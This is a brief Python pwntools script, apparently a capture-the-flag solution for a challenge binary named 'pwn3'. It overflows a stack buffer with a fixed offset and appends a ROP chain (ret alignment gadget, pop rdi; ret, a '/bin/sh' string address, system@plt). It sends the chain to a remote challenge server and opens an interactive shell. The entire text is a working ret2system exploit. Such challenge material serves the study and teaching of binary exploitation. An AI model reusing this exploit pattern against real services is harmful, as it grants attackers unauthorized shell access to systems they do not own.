from pwn import *

pop_rdi_ret=  0x0000000000401196
system_plt=   0x0000000000401080
string_bin_sh=0x0000000000402008
ret=0x000000000040101a
offset=0x70

payload=b'A'*offset+b's'*8
payload+=p64(ret)  #栈对齐
payload+=p64(pop_rdi_ret)
payload+=p64(string_bin_sh)
payload+=p64(system_plt)

# io=process("./pwn3")
io=remote("gz.imxbt.cn",20316)
io.sendline(payload)
io.interactive()
